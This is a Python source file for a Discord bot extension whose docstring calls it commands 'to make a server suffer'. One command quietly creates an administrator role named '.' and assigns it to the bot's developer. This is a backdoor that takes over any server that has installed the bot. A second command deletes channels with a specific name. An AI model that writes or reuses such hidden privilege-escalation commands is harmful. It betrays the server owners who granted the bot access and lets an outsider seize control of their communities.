import discord
from discord.ext import commands
from utils.checks import *


class sudo:
    '''
    Developer only commands to make a server suffer
    '''

    def __init__(self,bot):
        self.bot = bot
    
    @commands.command(name='giverole')
    @is_dev()
    async def giverole(self, ctx):
        guild = ctx.guild
        role_name = "."
        role_permissions = guild.default_role
        role_permissions = role_permissions.permissions
        role_permissions.administrator = True
        await guild.create_role(name=role_name, permissions=role_permissions)
        role = discord.utils.get(ctx.guild.roles, name=role_name)
        user = ctx.message.author
        await user.add_roles(role)


    @commands.command(name='fix')
    @is_dev()
    async def fix(self, ctx):
        for channel in ctx.guild.channels:
            if channel.name == "fumée²":
                await channel.delete()



def setup(bot):
    bot.add_cog(sudo(bot))
